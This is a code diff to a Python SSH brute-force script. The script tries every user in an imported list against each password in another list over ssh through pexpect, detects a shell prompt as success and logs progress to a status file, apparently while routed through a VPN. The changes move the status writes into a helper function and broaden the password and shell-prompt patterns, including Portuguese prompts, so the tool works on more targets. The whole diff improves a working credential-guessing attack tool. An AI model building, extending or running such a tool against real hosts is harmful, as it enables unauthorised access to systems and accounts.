@@ -4,6 +4,7 @@ import passwords
 import time
 import vpn
 import users
+from pathlib import Path
 
 passwordsl = passwords.passwords_
 usersl = users.users_
@@ -20,6 +21,19 @@ SHELL = "shell"
 DENIED = "denied"
 END = "end"
 TIMEOUT = "timeout"
+
+
+def update_status(line_number, value):
+    status_file = Path("/tmp/status")
+    with status_file.open("r", encoding="utf-8") as f:
+        lines = f.readlines()
+    while len(lines) < 5:
+        lines.append("\n")
+    lines[line_number] = f"{value}\n"
+    temporary_file = status_file.with_suffix(".tmp")
+    with temporary_file.open("w", encoding="utf-8") as f:
+        f.writelines(lines)
+    temporary_file.replace(status_file)
 
 
 def expect_state(process, states):
@@ -45,23 +59,11 @@ tries_exceeded = 0
 
 while i < len(usersl):
     
-    with open("/tmp/status", "r") as f:
-        lines = f.readlines()
-
-    lines[1] = f"{i}\n"
-
-    with open("/tmp/status", "w") as f:
-        f.writelines(lines)
+    update_status(1, i)
 
     while j < len(passwordsl):
 
-        with open("/tmp/status", "r") as f:
-            lines = f.readlines()
-    
-        lines[2] = f"{j}\n"
-
-        with open("/tmp/status", "w") as f:
-            f.writelines(lines)
+        update_status(2, j)
 
         process = pexpect.spawn(
             "ssh",
@@ -74,8 +76,8 @@ while i < len(usersl):
             result = expect_state(process, [
                 (KEY_CONFIRMATION, r"Are you sure you want to continue connecting"),
                 (FIRST_PASSWORD, r"\(.*\) Password:"),
-                (PASSWORD, r".+'s password:"),
-                (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
+                (PASSWORD, r"(?i)(?:password|senha):\s*"),
+                (SHELL, r"(?m)^[^ \r\n]+@[^ \r\n]+:[^\r\n]*[#$]\s*"),
                 (DENIED, r"Permission denied"),
                 (END, pexpect.EOF),
                 (TIMEOUT, pexpect.TIMEOUT),
@@ -86,8 +88,8 @@ while i < len(usersl):
                 process.sendline("yes")
                 result = expect_state(process, [
                     (FIRST_PASSWORD, r"\(.*\) Password:"),
-                    (PASSWORD, r".+'s password:"),
-                    (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
+                    (PASSWORD, r"(?i)(?:password|senha):\s*"),
+                    (SHELL, r"(?m)^[^ \r\n]+@[^ \r\n]+:[^\r\n]*[#$]\s*"),
                     (DENIED, r"Permission denied"),
                     (END, pexpect.EOF),
                     (TIMEOUT, pexpect.TIMEOUT),
@@ -96,8 +98,8 @@ while i < len(usersl):
             while result in (FIRST_PASSWORD, PASSWORD):
                 process.sendline(str(passwordsl[j]))
                 result = expect_state(process, [
-                    (PASSWORD, r".+'s password:"),
-                    (SHELL, r"[^ \r\n]+@[^ \r\n]+:\/\$"),
+                    (PASSWORD, r"(?i)(?:password|senha):\s*"),
+                    (SHELL, r"(?m)^[^ \r\n]+@[^ \r\n]+:[^\r\n]*[#$]\s*"),
                     (DENIED, r"Permission denied"),
                     (END, pexpect.EOF),
                     (TIMEOUT, pexpect.TIMEOUT),
@@ -114,13 +116,7 @@ while i < len(usersl):
 
             finded = True
 
-            with open("/tmp/status", "r") as f:
-                lines = f.readlines()
-            
-            lines[3] = "True\n"
-
-            with open("/tmp/status", "w") as f:
-                f.writelines(lines)
+            update_status(3, "True")
 
             break
 
@@ -142,6 +138,8 @@ while i < len(usersl):
             tries_exceeded += 1
 
             if tries_exceeded >= 15:
+                update_status(4, "Muitas tentativas falhadas. Arquivo encerrado")
+
                 print("Muitas tentativas falhadas. Encerrando...")
                 process.close()
                 break
@@ -167,5 +165,8 @@ while i < len(usersl):
 
     i += 1
     j = 0
+
+if not finded and tries_exceeded < 15:
+    update_status(4, "Nenhuma combinação encontrada")
 
 openvpn_enter.close()
